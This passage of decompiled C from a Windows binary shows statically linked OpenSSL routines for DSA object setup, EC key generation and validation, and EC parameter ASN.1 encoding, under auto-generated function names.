int __cdecl sub_41D8C0(void ***a1, void **a2, void **a3, void **a4)
{
  if ( !a1[2] && !a2 || !a1[3] && !a3 || !a1[4] && !a4 )
    return 0;
  if ( a2 )
  {
    sub_417060(a1[2]);
    a1[2] = a2;
  }
  if ( a3 )
  {
    sub_417060(a1[3]);
    a1[3] = a3;
  }
  if ( a4 )
  {
    sub_417060(a1[4]);
    a1[4] = a4;
  }
  return 1;
}

//----- (0041D940) --------------------------------------------------------
int __cdecl sub_41D940(int a1, int a2, int a3)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 20);
  if ( !result )
  {
    if ( !a2 )
      return result;
    goto LABEL_5;
  }
  if ( a2 )
  {
LABEL_5:
    sub_417060(*(void ***)(a1 + 20));
    *(_DWORD *)(a1 + 20) = a2;
  }
  if ( a3 )
  {
    sub_417060(*(void ***)(a1 + 24));
    *(_DWORD *)(a1 + 24) = a3;
  }
  return 1;
}

//----- (0041D990) --------------------------------------------------------
int __cdecl sub_41D990(int a1)
{
  return *(_DWORD *)(a1 + 48);
}

//----- (0041D9A0) --------------------------------------------------------
int __cdecl sub_41D9A0(int a1)
{
  return sub_416F90(*(_DWORD **)(a1 + 8));
}

//----- (0041D9B0) --------------------------------------------------------
int __cdecl sub_41D9B0(_DWORD *a1)
{
  _DWORD *v1; // eax
  int v2; // esi
  struct _RTL_CRITICAL_SECTION *v4; // eax
  char **LockCount; // eax
  int v6; // eax
  int (__cdecl *v7)(int); // eax

  v1 = sub_413430(0x38u);
  v2 = (int)v1;
  if ( !v1 )
  {
    sub_408310(10, 103, 65, (int)"crypto\\dsa\\dsa_lib.c", 69);
    return 0;
  }
  v1[9] = 1;
  v4 = sub_414650();
  *(_DWORD *)(v2 + 52) = v4;
  if ( !v4 )
  {
    sub_408310(10, 103, 65, (int)"crypto\\dsa\\dsa_lib.c", 76);
    sub_413490((void *)v2);
    return 0;
  }
  LockCount = (char **)stru_538F78.LockCount;
  if ( !stru_538F78.LockCount )
  {
    LockCount = sub_4351C0();
    stru_538F78.LockCount = (LONG)LockCount;
  }
  *(_DWORD *)(v2 + 44) = LockCount;
  *(_DWORD *)(v2 + 28) = (unsigned int)LockCount[8] & 0xFFFFFBFF;
  if ( a1 )
  {
    if ( !sub_416200(a1) )
    {
      sub_408310(10, 103, 38, (int)"crypto\\dsa\\dsa_lib.c", 86);
      goto LABEL_19;
    }
    *(_DWORD *)(v2 + 48) = a1;
  }
  else
  {
    *(_DWORD *)(v2 + 48) = sub_4359C0();
  }
  if ( !*(_DWORD *)(v2 + 48) || (v6 = sub_407400(*(_DWORD *)(v2 + 48)), (*(_DWORD *)(v2 + 44) = v6) != 0) )
  {
    *(_DWORD *)(v2 + 28) = *(_DWORD *)(*(_DWORD *)(v2 + 44) + 32) & 0xFFFFFBFF;
    if ( sub_414B00(7u, v2, (int **)(v2 + 40)) )
    {
      v7 = *(int (__cdecl **)(int))(*(_DWORD *)(v2 + 44) + 24);
      if ( !v7 || v7(v2) )
        return v2;
      sub_408310(10, 103, 70, (int)"crypto\\dsa\\dsa_lib.c", 107);
    }
  }
  else
  {
    sub_408310(10, 103, 38, (int)"crypto\\dsa\\dsa_lib.c", 95);
  }
LABEL_19:
  sub_41D610((volatile LONG *)v2);
  return 0;
}

//----- (0041DAF0) --------------------------------------------------------
int sub_41DAF0()
{
  return sub_41D9B0(0);
}

//----- (0041DB00) --------------------------------------------------------
int __cdecl sub_41DB00(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_4F3030);
}

//----- (0041DB20) --------------------------------------------------------
void *sub_41DB20()
{
  void *result; // eax

  result = sub_413430(8u);
  if ( !result )
  {
    sub_408310(10, 102, 65, (int)"crypto\\dsa\\dsa_asn1.c", 28);
    return 0;
  }
  return result;
}

//----- (0041DB60) --------------------------------------------------------
void __cdecl sub_41DB60(_DWORD **Block)
{
  if ( Block )
  {
    sub_417000(*Block);
    sub_417000(Block[1]);
    sub_413490(Block);
  }
}

//----- (0041DB90) --------------------------------------------------------
int __cdecl sub_41DB90(_DWORD **a1, _DWORD *a2, _DWORD *a3)
{
  if ( !a2 || !a3 )
    return 0;
  sub_417000(*a1);
  sub_417000(a1[1]);
  *a1 = a2;
  a1[1] = a3;
  return 1;
}

//----- (0041DBD0) --------------------------------------------------------
int __cdecl sub_41DBD0(int a1, volatile LONG **a2)
{
  int v2; // eax

  if ( a1 )
  {
    if ( a1 == 2 )
    {
      sub_41D610(*a2);
      *a2 = 0;
      return 2;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    v2 = sub_41DAF0();
    *a2 = (volatile LONG *)v2;
    return v2 != 0 ? 2 : 0;
  }
}

//----- (0041DC20) --------------------------------------------------------
int __cdecl sub_41DC20(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_4F3064);
}

//----- (0041DC60) --------------------------------------------------------
int __cdecl sub_41DC60(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_4F314C);
}

//----- (0041DC80) --------------------------------------------------------
signed int __cdecl sub_41DC80(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_4F314C);
}

//----- (0041DCA0) --------------------------------------------------------
int __cdecl sub_41DCA0(int a1, int a2, int a3, void *a4, signed int *a5, int a6)
{
  int result; // eax
  _DWORD **v7; // esi
  signed int v8; // eax

  sub_406F30();
  result = sub_4359D0(a2, a3, a6);
  v7 = (_DWORD **)result;
  if ( result )
  {
    v8 = sub_42F620(result, &a4, (int)&unk_4F3030);
    *a5 = v8;
    sub_417000(*v7);
    sub_417000(v7[1]);
    sub_413490(v7);
    return 1;
  }
  else
  {
    *a5 = 0;
  }
  return result;
}

//----- (0041DD10) --------------------------------------------------------
int __cdecl sub_41DD10(int a1, int a2, int a3, _DWORD **Block, int a5, int a6)
{
  _BYTE *v6; // esi
  int v7; // edi
  int v8; // ebp
  _DWORD **v9; // ebx
  int v11; // ebx
  unsigned int v12; // eax
  _BYTE *v13; // ecx
  _DWORD **v14; // esi
  void *v15; // [esp+10h] [ebp-8h] BYREF
  void *v16; // [esp+14h] [ebp-4h] BYREF

  v6 = Block;
  v7 = -1;
  v16 = Block;
  v15 = 0;
  v8 = -1;
  v9 = (_DWORD **)sub_413430(8u);
  if ( !v9 )
    sub_408310(10, 102, 65, (int)"crypto\\dsa\\dsa_asn1.c", 28);
  Block = v9;
  if ( !v9 )
    return -1;
  v11 = a5;
  if ( sub_42E9C0((int *)&Block, &v16, a5, (int)&unk_4F3030) )
  {
    v12 = sub_42F620((int)Block, &v15, (int)&unk_4F3030);
    v7 = v12;
    if ( v12 == v11 )
    {
      v13 = v15;
      if ( v12 < 4 )
      {
LABEL_10:
        if ( !v12 || *v13 == *v6 && (v12 <= 1 || v13[1] == v6[1] && (v12 <= 2 || v13[2] == v6[2])) )
          v8 = sub_4359E0(a2, a3, (int)Block, a6);
      }
      else
      {
        while ( *(_DWORD *)v6 == *(_DWORD *)v13 )
        {
          v12 -= 4;
          v13 += 4;
          v6 += 4;
          if ( v12 < 4 )
            goto LABEL_10;
        }
      }
    }
  }
  sub_4134B0(v15, v7);
  v14 = Block;
  if ( Block )
  {
    sub_417000(*Block);
    sub_417000(v14[1]);
    sub_413490(v14);
  }
  return v8;
}

//----- (0041DE60) --------------------------------------------------------
int sub_41DE60()
{
  return sub_435A00(0);
}

//----- (0041DE70) --------------------------------------------------------
void __cdecl sub_41DE70(volatile LONG *Block)
{
  volatile LONG **v1; // esi
  void (__cdecl *v2)(volatile LONG **); // eax
  volatile LONG *v3; // eax
  void (__cdecl *v4)(volatile LONG **); // eax

  v1 = (volatile LONG **)Block;
  if ( Block )
  {
    sub_4147E0(Block + 8, -1, &Block);
    if ( (int)Block <= 0 )
    {
      v2 = (void (__cdecl *)(volatile LONG **))*((_DWORD *)*v1 + 3);
      if ( v2 )
        v2(v1);
      sub_4162A0(v1[1]);
      v3 = v1[3];
      if ( v3 )
      {
        v4 = *(void (__cdecl **)(volatile LONG **))(*v3 + 188);
        if ( v4 )
          v4(v1);
      }
      sub_414DC0(8u, (int)v1, (int **)v1 + 10);
      sub_4146D0((LPCRITICAL_SECTION)v1[11]);
      sub_4367A0((volatile LONG **)v1[3]);
      sub_436040((void *)v1[4]);
      sub_417000(v1[5]);
      sub_4134B0(v1, 48);
    }
  }
}

//----- (0041DF20) --------------------------------------------------------
int __cdecl sub_41DF20(int a1, int *a2)
{
  void (__cdecl *v2)(int); // eax
  int v3; // eax
  void (__cdecl *v4)(int); // eax
  int v5; // eax
  int v6; // ebx
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  int (__cdecl *v10)(int, int *); // eax
  int (__cdecl *v11)(int, int *); // eax

  if ( a1 && a2 )
  {
    if ( *a2 != *(_DWORD *)a1 )
    {
      v2 = *(void (__cdecl **)(int))(*(_DWORD *)a1 + 12);
      if ( v2 )
        v2(a1);
      v3 = *(_DWORD *)(a1 + 12);
      if ( v3 )
      {
        v4 = *(void (__cdecl **)(int))(*(_DWORD *)v3 + 188);
        if ( v4 )
          v4(a1);
      }
      if ( !sub_4162A0(*(volatile LONG **)(a1 + 4)) )
        return 0;
      *(_DWORD *)(a1 + 4) = 0;
    }
    v5 = a2[3];
    if ( !v5 )
      goto LABEL_35;
    v6 = sub_435D30(v5);
    sub_4367A0(*(volatile LONG ***)(a1 + 12));
    v7 = sub_435C30(v6);
    *(_DWORD *)(a1 + 12) = v7;
    if ( v7 )
    {
      if ( sub_436900((int)v7, a2[3]) )
      {
        if ( !a2[4]
          || (sub_436040(*(void **)(a1 + 16)), v8 = sub_435F90((int *)a2[3]), (*(_DWORD *)(a1 + 16) = v8) != 0)
          && sub_4360B0(v8, (_DWORD *)a2[4]) )
        {
          if ( !a2[5]
            || (*(_DWORD *)(a1 + 20) || (v9 = sub_4168C0(), (*(_DWORD *)(a1 + 20) = v9) != 0))
            && sub_4173E0(*(_DWORD **)(a1 + 20), (_DWORD *)a2[5])
            && ((v10 = *(int (__cdecl **)(int, int *))(*(_DWORD *)a2[3] + 184)) == 0 || v10(a1, a2)) )
          {
LABEL_35:
            *(_DWORD *)(a1 + 24) = a2[6];
            *(_DWORD *)(a1 + 28) = a2[7];
            *(_DWORD *)(a1 + 8) = a2[2];
            *(_DWORD *)(a1 + 36) = a2[9];
            if ( sub_414C40(8u, (int *)(a1 + 40), a2 + 10) )
            {
              if ( *a2 != *(_DWORD *)a1 )
              {
                if ( a2[1] && !sub_416200((_DWORD *)a2[1]) )
                  return 0;
                *(_DWORD *)(a1 + 4) = a2[1];
                *(_DWORD *)a1 = *a2;
              }
              v11 = *(int (__cdecl **)(int, int *))(*a2 + 16);
              if ( !v11 || v11(a1, a2) )
                return a1;
            }
          }
        }
      }
    }
  }
  else
  {
    sub_408310(16, 178, 67, (int)"crypto\\ec\\ec_key.c", 80);
  }
  return 0;
}

//----- (0041E0E0) --------------------------------------------------------
volatile LONG *__cdecl sub_41E0E0(int a1)
{
  int v1; // eax
  volatile LONG *v2; // esi

  v1 = sub_435A00(*(_DWORD **)(a1 + 4));
  v2 = (volatile LONG *)v1;
  if ( !v1 )
    return 0;
  if ( !sub_41DF20(v1, (int *)a1) )
  {
    sub_41DE70(v2);
    return 0;
  }
  return v2;
}

//----- (0041E120) --------------------------------------------------------
BOOL __cdecl sub_41E120(int a1)
{
  return sub_4147E0((volatile LONG *)(a1 + 32), 1, &a1) > 0 && a1 > 1;
}

//----- (0041E150) --------------------------------------------------------
int __cdecl sub_41E150(_DWORD *a1)
{
  int (*v1)(void); // ecx

  if ( a1 && a1[3] )
  {
    v1 = *(int (**)(void))(*a1 + 32);
    if ( v1 )
    {
      return v1();
    }
    else
    {
      sub_408310(16, 179, 152, (int)"crypto\\ec\\ec_key.c", 188);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 179, 67, (int)"crypto\\ec\\ec_key.c", 183);
    return 0;
  }
}

//----- (0041E1B0) --------------------------------------------------------
int __cdecl sub_41E1B0(int a1)
{
  if ( !*(_DWORD *)(**(_DWORD **)(a1 + 12) + 172) )
    sub_417C70("assertion failed: eckey->group->meth->keygen != NULL", "crypto\\ec\\ec_key.c", 194);
  return (*(int (__cdecl **)(int))(**(_DWORD **)(a1 + 12) + 172))(a1);
}

//----- (0041E1F0) --------------------------------------------------------
int __cdecl sub_41E1F0(int *a1)
{
  _DWORD *v1; // ebx
  void **v2; // esi
  _DWORD *v3; // ebp
  void **Block; // [esp+Ch] [ebp-8h]
  int v6; // [esp+10h] [ebp-4h]

  v1 = 0;
  v6 = 0;
  v2 = 0;
  Block = (void **)sub_420670();
  if ( Block )
  {
    v2 = (void **)a1[5];
    if ( v2 || (v2 = (void **)sub_4168C0()) != 0 )
    {
      v3 = (_DWORD *)sub_432B60(a1[3]);
      if ( v3 )
      {
        while ( sub_42A970(v2, v3) )
        {
          if ( !sub_416DB0((int)v2) )
          {
            v1 = (_DWORD *)a1[4];
            if ( v1 || (v1 = sub_435F90((int *)a1[3])) != 0 )
            {
              if ( sub_436650((int *)a1[3], v1, v2, 0, 0, (int)Block) )
              {
                a1[5] = (int)v2;
                a1[4] = (int)v1;
                v6 = 1;
              }
            }
            break;
          }
        }
      }
    }
  }
  if ( !a1[4] )
    sub_436040(v1);
  if ( (void **)a1[5] != v2 )
    sub_417060(v2);
  sub_4206C0(Block);
  return v6;
}

//----- (0041E2E0) --------------------------------------------------------
int __cdecl sub_41E2E0(int **a1)
{
  return sub_436650(a1[3], a1[4], a1[5], 0, 0, 0);
}

//----- (0041E300) --------------------------------------------------------
int __cdecl sub_41E300(int *a1)
{
  void **v1; // ebx
  _DWORD *v2; // edi
  int v3; // ecx
  _DWORD *v4; // ebp
  _DWORD *v5; // eax
  int v7; // [esp+Ch] [ebp-4h]

  v1 = 0;
  v2 = 0;
  v7 = 0;
  if ( a1 )
  {
    v3 = a1[3];
    if ( v3 )
    {
      if ( a1[4] )
      {
        if ( sub_436430(v3, (_DWORD *)a1[4]) )
        {
          sub_408310(16, 258, 106, (int)"crypto\\ec\\ec_key.c", 283);
        }
        else
        {
          v1 = (void **)sub_420670();
          if ( !v1 )
            goto LABEL_26;
          v2 = sub_435F90((int *)a1[3]);
          if ( !v2 )
            goto LABEL_26;
          if ( sub_436490(a1[3], (_DWORD *)a1[4], (int)v1) > 0 )
          {
            v4 = *(_DWORD **)(a1[3] + 8);
            if ( sub_416DB0((int)v4) )
            {
              sub_408310(16, 258, 122, (int)"crypto\\ec\\ec_key.c", 300);
            }
            else if ( sub_436650((int *)a1[3], v2, 0, a1[4], (int)v4, (int)v1) )
            {
              if ( sub_436430(a1[3], v2) )
              {
                v5 = (_DWORD *)a1[5];
                if ( !v5 )
                  goto LABEL_25;
                if ( sub_4169B0(v5, v4) >= 0 )
                {
                  sub_408310(16, 258, 130, (int)"crypto\\ec\\ec_key.c", 317);
                  goto LABEL_26;
                }
                if ( !sub_436650((int *)a1[3], v2, (_DWORD *)a1[5], 0, 0, (int)v1) )
                {
                  sub_408310(16, 258, 16, (int)"crypto\\ec\\ec_key.c", 322);
                  goto LABEL_26;
                }
                if ( sub_4364F0(a1[3], v2, (_DWORD *)a1[4], (int)v1) )
                  sub_408310(16, 258, 123, (int)"crypto\\ec\\ec_key.c", 326);
                else
LABEL_25:
                  v7 = 1;
              }
              else
              {
                sub_408310(16, 258, 130, (int)"crypto\\ec\\ec_key.c", 308);
              }
            }
            else
            {
              sub_408310(16, 258, 16, (int)"crypto\\ec\\ec_key.c", 304);
            }
          }
          else
          {
            sub_408310(16, 258, 107, (int)"crypto\\ec\\ec_key.c", 294);
          }
        }
LABEL_26:
        sub_4206C0(v1);
        sub_436040(v2);
        return v7;
      }
    }
  }
  sub_408310(16, 258, 67, (int)"crypto\\ec\\ec_key.c", 278);
  return 0;
}

//----- (0041E520) --------------------------------------------------------
int __cdecl sub_41E520(volatile LONG ***a1, int *a2)
{
  volatile LONG *v2; // eax
  int result; // eax
  volatile LONG **v4; // eax

  v2 = (*a1)[5];
  if ( !v2 || (result = ((int (__cdecl *)(volatile LONG ***, int *))v2)(a1, a2)) != 0 )
  {
    sub_4367A0(a1[3]);
    v4 = sub_436AE0(a2);
    a1[3] = v4;
    return v4 != 0;
  }
  return result;
}

//----- (0041E580) --------------------------------------------------------
int __cdecl sub_41E580(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 36) |= a2;
  return result;
}

//----- (0041E590) --------------------------------------------------------
int __cdecl sub_41E590(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 36) &= ~a2;
  return result;
}

//----- (0041E5A0) --------------------------------------------------------
int __cdecl sub_41E5A0(int a1, int a2, _DWORD *a3, int *a4)
{
  _DWORD *v4; // ecx
  int v5; // eax

  if ( a1 && (v4 = *(_DWORD **)(a1 + 16)) != 0 && (v5 = *(_DWORD *)(a1 + 12)) != 0 )
    return sub_437210(v5, v4, a2, a3, a4);
  else
    return 0;
}

//----- (0041E5E0) --------------------------------------------------------
int __usercall sub_41E5E0@<eax>(__m64 a1@<mm0>, int a2, _BYTE *a3, int a4, int *a5)
{
  int **v5; // eax
  int result; // eax

  if ( !a2 || !*(_DWORD *)(a2 + 12) )
    return 0;
  if ( !*(_DWORD *)(a2 + 16) )
    *(_DWORD *)(a2 + 16) = sub_435F90(*(int **)(a2 + 12));
  v5 = *(int ***)(a2 + 16);
  if ( !v5 )
    return 0;
  result = sub_437160(a1, *(int ***)(a2 + 12), v5, a3, a4, a5);
  if ( result )
  {
    if ( (***(_BYTE ***)(a2 + 12) & 2) == 0 )
      *(_DWORD *)(a2 + 28) = *a3 & 0xFE;
    return 1;
  }
  return result;
}

//----- (0041E650) --------------------------------------------------------
int __cdecl sub_41E650(int a1)
{
  int v1; // eax
  int (*v2)(void); // eax

  v1 = *(_DWORD *)(a1 + 12);
  if ( !v1 || !*(_DWORD *)v1 )
    return 0;
  v2 = *(int (**)(void))(*(_DWORD *)v1 + 160);
  if ( !v2 )
  {
    sub_408310(16, 256, 66, (int)"crypto\\ec\\ec_key.c", 555);
    return 0;
  }
  return v2();
}

//----- (0041E690) --------------------------------------------------------
int __cdecl sub_41E690(int a1, char *a2, unsigned int a3)
{
  int v3; // kr00_4
  _DWORD *v4; // eax
  unsigned int v5; // esi

  v3 = sub_435D40(*(_DWORD *)(a1 + 12)) + 7;
  v4 = *(_DWORD **)(a1 + 20);
  v5 = v3 / 8;
  if ( !v4 )
    return 0;
  if ( a2 )
  {
    if ( a3 < v5 )
      return 0;
    if ( sub_4172E0(v4, a2, v5) == -1 )
    {
      sub_408310(16, 260, 100, (int)"crypto\\ec\\ec_key.c", 578);
      return 0;
    }
  }
  return v3 / 8;
}

//----- (0041E700) --------------------------------------------------------
int __cdecl sub_41E700(int a1)
{
  int v1; // eax
  int (*v2)(void); // eax

  v1 = *(_DWORD *)(a1 + 12);
  if ( !v1 || !*(_DWORD *)v1 )
    return 0;
  v2 = *(int (**)(void))(*(_DWORD *)v1 + 164);
  if ( !v2 )
  {
    sub_408310(16, 255, 66, (int)"crypto\\ec\\ec_key.c", 590);
    return 0;
  }
  return v2();
}

//----- (0041E740) --------------------------------------------------------
int __cdecl sub_41E740(int a1, _BYTE *a2, int a3)
{
  int v4; // eax

  if ( !*(_DWORD *)(a1 + 20) )
    *(_DWORD *)(a1 + 20) = sub_416900();
  if ( *(_DWORD *)(a1 + 20) )
  {
    v4 = sub_4174D0(a2, a3, *(_DWORD *)(a1 + 20));
    *(_DWORD *)(a1 + 20) = v4;
    if ( v4 )
    {
      return 1;
    }
    else
    {
      sub_408310(16, 259, 3, (int)"crypto\\ec\\ec_key.c", 606);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 259, 65, (int)"crypto\\ec\\ec_key.c", 601);
    return 0;
  }
}

//----- (0041E7C0) --------------------------------------------------------
int __cdecl sub_41E7C0(int a1, _DWORD *a2)
{
  int v2; // eax
  int (__cdecl *v3)(int, _DWORD, _DWORD); // eax
  int result; // eax
  size_t v5; // eax
  void *v6; // esi

  v2 = *(_DWORD *)(a1 + 12);
  if ( !v2 || !*(_DWORD *)v2 )
    return 0;
  v3 = *(int (__cdecl **)(int, _DWORD, _DWORD))(*(_DWORD *)v2 + 160);
  if ( !v3 )
  {
    sub_408310(16, 256, 66, (int)"crypto\\ec\\ec_key.c", 555);
    return 0;
  }
  v5 = v3(a1, 0, 0);
  if ( !v5 )
    return 0;
  v6 = sub_4133F0(v5);
  if ( !v6 )
    return 0;
  result = sub_41E650(a1);
  if ( !result )
  {
    sub_413490(v6);
    return 0;
  }
  *a2 = v6;
  return result;
}

//----- (0041E860) --------------------------------------------------------
BOOL __cdecl sub_41E860(int a1)
{
  _DWORD *v1; // eax

  v1 = *(_DWORD **)(a1 + 12);
  return v1 && *v1 && (*(_BYTE *)*v1 & 4) == 0;
}

//----- (0041E880) --------------------------------------------------------
int __cdecl sub_41E880(int a1)
{
  int v1; // esi
  int v2; // eax
  _DWORD *v3; // eax

  v1 = 0;
  v2 = sub_435D30(a1);
  if ( sub_422350(v2) != 407 )
    return 0;
  v3 = (_DWORD *)(a1 + 40);
  if ( !*(_DWORD *)(a1 + 40) )
    return 0;
  do
  {
    ++v3;
    ++v1;
  }
  while ( *v3 );
  if ( v1 == 4 )
    return 683;
  if ( v1 == 2 )
    return 682;
  else
    return 0;
}

//----- (0041E8D0) --------------------------------------------------------
int __cdecl sub_41E8D0(_DWORD *a1, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax

  if ( !a1 )
    return 0;
  v2 = sub_435D30((int)a1);
  if ( sub_422350(v2) != 407 || !a1[10] || (v3 = a1[11]) == 0 || a1[12] )
  {
    sub_408310(16, 194, 66, (int)"crypto\\ec\\ec_asn1.c", 48);
    return 0;
  }
  if ( a2 )
    *a2 = v3;
  return 1;
}

//----- (0041E930) --------------------------------------------------------
int __cdecl sub_41E930(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  int v4; // eax
  int v5; // eax

  if ( !a1 )
    return 0;
  v4 = sub_435D30((int)a1);
  if ( sub_422350(v4) != 407 || !a1[10] || !a1[11] || !a1[12] || (v5 = a1[13]) == 0 || a1[14] )
  {
    sub_408310(16, 193, 66, (int)"crypto\\ec\\ec_asn1.c", 70);
    return 0;
  }
  if ( a2 )
    *a2 = v5;
  if ( a3 )
    *a3 = a1[12];
  if ( a4 )
    *a4 = a1[11];
  return 1;
}

//----- (0041E9C0) --------------------------------------------------------
void *sub_41E9C0()
{
  return &unk_4F3404;
}

//----- (0041E9D0) --------------------------------------------------------
void *sub_41E9D0()
{
  return &unk_4F3434;
}

//----- (0041E9E0) --------------------------------------------------------
void *sub_41E9E0()
{
  return &unk_4F34D4;
}

//----- (0041E9F0) --------------------------------------------------------
void *sub_41E9F0()
{
  return &unk_4F3534;
}

//----- (0041EA00) --------------------------------------------------------
void *sub_41EA00()
{
  return &unk_4F3578;
}

//----- (0041EA10) --------------------------------------------------------
void *sub_41EA10()
{
  return &unk_4F35D0;
}

//----- (0041EA20) --------------------------------------------------------
void *sub_41EA20()
{
  return &unk_4F35EC;
}

//----- (0041EA30) --------------------------------------------------------
void *sub_41EA30()
{
  return &unk_4F36BC;
}

//----- (0041EA40) --------------------------------------------------------
signed int __cdecl sub_41EA40(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_4F3728);
}

//----- (0041EA60) --------------------------------------------------------
void __cdecl sub_41EA60(int a1)
{
  sub_42FEF0(a1, (int)&unk_4F3728);
}

//----- (0041EA80) --------------------------------------------------------
int __usercall sub_41EA80@<eax>(int a1@<ecx>, _DWORD *a2@<ebx>)
{
  void **v2; // ebp
  int v4; // eax
  int v5; // esi
  char **v6; // eax
  _DWORD *v7; // eax
  int *v8; // esi
  int v9; // eax
  int v10; // edi
  char **v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  int v14; // ecx
  int v16; // eax
  int v17; // [esp+Ch] [ebp-Ch] BYREF
  int v18; // [esp+10h] [ebp-8h] BYREF
  int v19; // [esp+14h] [ebp-4h] BYREF

  v2 = 0;
  if ( a2 && a1 )
  {
    sub_422B70(*(void ***)a1);
    sub_42C610(*(_DWORD *)(a1 + 4));
    v4 = sub_435D30((int)a2);
    v5 = sub_422350(v4);
    v6 = sub_423310(v5);
    *(_DWORD *)a1 = v6;
    if ( !v6 )
    {
      sub_408310(16, 154, 8, (int)"crypto\\ec\\ec_asn1.c", 255);
LABEL_34:
      sub_417060(v2);
      return 0;
    }
    if ( v5 == 406 )
    {
      v2 = (void **)sub_4168C0();
      if ( !v2 )
      {
        sub_408310(16, 154, 65, (int)"crypto\\ec\\ec_asn1.c", 261);
        goto LABEL_34;
      }
      if ( !sub_435E90((int)a2) )
      {
        sub_408310(16, 154, 16, (int)"crypto\\ec\\ec_asn1.c", 266);
        goto LABEL_34;
      }
      v7 = sub_4318B0(v2, 0);
      *(_DWORD *)(a1 + 4) = v7;
      if ( !v7 )
      {
        sub_408310(16, 154, 13, (int)"crypto\\ec\\ec_asn1.c", 272);
        goto LABEL_34;
      }
    }
    else
    {
      if ( v5 != 407 )
      {
        sub_408310(16, 154, 131, (int)"crypto\\ec\\ec_asn1.c", 351);
        goto LABEL_34;
      }
      v8 = (int *)sub_42FB20((int)&unk_4F34D4);
      *(_DWORD *)(a1 + 4) = v8;
      if ( !v8 )
      {
        sub_408310(16, 154, 65, (int)"crypto\\ec\\ec_asn1.c", 290);
        goto LABEL_34;
      }
      *v8 = sub_435F50((int)a2);
      v9 = sub_41E880((int)a2);
      v10 = v9;
      if ( !v9 )
      {
        sub_408310(16, 154, 16, (int)"crypto\\ec\\ec_asn1.c", 299);
        goto LABEL_34;
      }
      v11 = sub_423310(v9);
      v8[1] = (int)v11;
      if ( !v11 )
      {
        sub_408310(16, 154, 8, (int)"crypto\\ec\\ec_asn1.c", 304);
        goto LABEL_34;
      }
      if ( v10 == 682 )
      {
        if ( !sub_41E8D0(a2, &v17) )
          goto LABEL_34;
        v12 = sub_42C490();
        v8[2] = (int)v12;
        if ( !v12 )
        {
          sub_408310(16, 154, 65, (int)"crypto\\ec\\ec_asn1.c", 316);
          goto LABEL_34;
        }
        if ( !sub_431840((int)v12, v17) )
        {
          sub_408310(16, 154, 13, (int)"crypto\\ec\\ec_asn1.c", 320);
          goto LABEL_34;
        }
      }
      else if ( v10 == 683 )
      {
        if ( !sub_41E930(a2, &v17, &v18, &v19) )
          goto LABEL_34;
        v13 = (_DWORD *)sub_42FB20((int)&unk_4F3404);
        v8[2] = (int)v13;
        if ( !v13 )
        {
          sub_408310(16, 154, 65, (int)"crypto\\ec\\ec_asn1.c", 331);
          goto LABEL_34;
        }
        v14 = v18;
        *v13 = v17;
        *(_DWORD *)(v8[2] + 4) = v14;
        *(_DWORD *)(v8[2] + 8) = v19;
      }
      else
      {
        v16 = sub_42C580();
        v8[2] = v16;
        if ( !v16 )
        {
          sub_408310(16, 154, 65, (int)"crypto\\ec\\ec_asn1.c", 344);
          goto LABEL_34;
        }
      }
    }
    sub_417060(v2);
    return 1;
  }
  return 0;
}

//----- (0041ED10) --------------------------------------------------------
int __cdecl sub_41ED10(int a1, int *a2)
{
  _DWORD *v2; // ebx
  int v3; // eax
  int v4; // kr00_4
  int v5; // edi
  int v6; // ebx
  void *v7; // eax
  void *v8; // esi
  char *v9; // edi
  int v10; // esi
  _DWORD *v11; // eax
  char *v12; // eax
  int v14; // [esp-8h] [ebp-30h]
  char v15; // [esp+Fh] [ebp-19h] BYREF
  void *v16; // [esp+10h] [ebp-18h]
  void *Src; // [esp+14h] [ebp-14h]
  void *Block; // [esp+18h] [ebp-10h]
  void *v19; // [esp+1Ch] [ebp-Ch]
  int v20; // [esp+20h] [ebp-8h]
  void *v21; // [esp+24h] [ebp-4h]

  v20 = 0;
  v16 = 0;
  Block = 0;
  v19 = 0;
  v15 = 0;
  if ( a1 && a2 && *a2 && a2[1] )
  {
    v2 = sub_4168C0();
    v21 = v2;
    if ( !v2 || (v16 = sub_4168C0()) == 0 )
    {
      v14 = 375;
      goto LABEL_37;
    }
    v3 = sub_435D30(a1);
    if ( sub_422350(v3) == 406 )
    {
      if ( !sub_435E90(a1) )
      {
        sub_408310(16, 153, 16, (int)"crypto\\ec\\ec_asn1.c", 384);
LABEL_38:
        sub_413490(Block);
        sub_413490(v19);
        sub_417060((void **)v21);
        sub_417060((void **)v16);
        return v20;
      }
    }
    else if ( !sub_435F10(a1) )
    {
      sub_408310(16, 153, 16, (int)"crypto\\ec\\ec_asn1.c", 392);
      goto LABEL_38;
    }
    v4 = sub_416F90(v2) + 7;
    v5 = (sub_416F90(v16) + 7) / 8;
    if ( v4 / 8 )
    {
      v7 = sub_4133F0(v4 / 8);
      v8 = v7;
      Block = v7;
      if ( !v7 )
      {
        v14 = 406;
LABEL_37:
        sub_408310(16, 153, 65, (int)"crypto\\ec\\ec_asn1.c", v14);
        goto LABEL_38;
      }
      v6 = sub_417300(v2, (char *)v7);
      if ( !v6 )
      {
        sub_408310(16, 153, 3, (int)"crypto\\ec\\ec_asn1.c", 410);
        goto LABEL_38;
      }
      Src = v8;
    }
    else
    {
      Src = &v15;
      v6 = 1;
    }
    if ( v5 )
    {
      v12 = (char *)sub_4133F0(v5);
      v9 = v12;
      v19 = v12;
      if ( !v12 )
      {
        v14 = 422;
        goto LABEL_37;
      }
      v10 = sub_417300(v16, v12);
      if ( !v10 )
      {
        sub_408310(16, 153, 3, (int)"crypto\\ec\\ec_asn1.c", 426);
        goto LABEL_38;
      }
    }
    else
    {
      v9 = &v15;
      v10 = 1;
    }
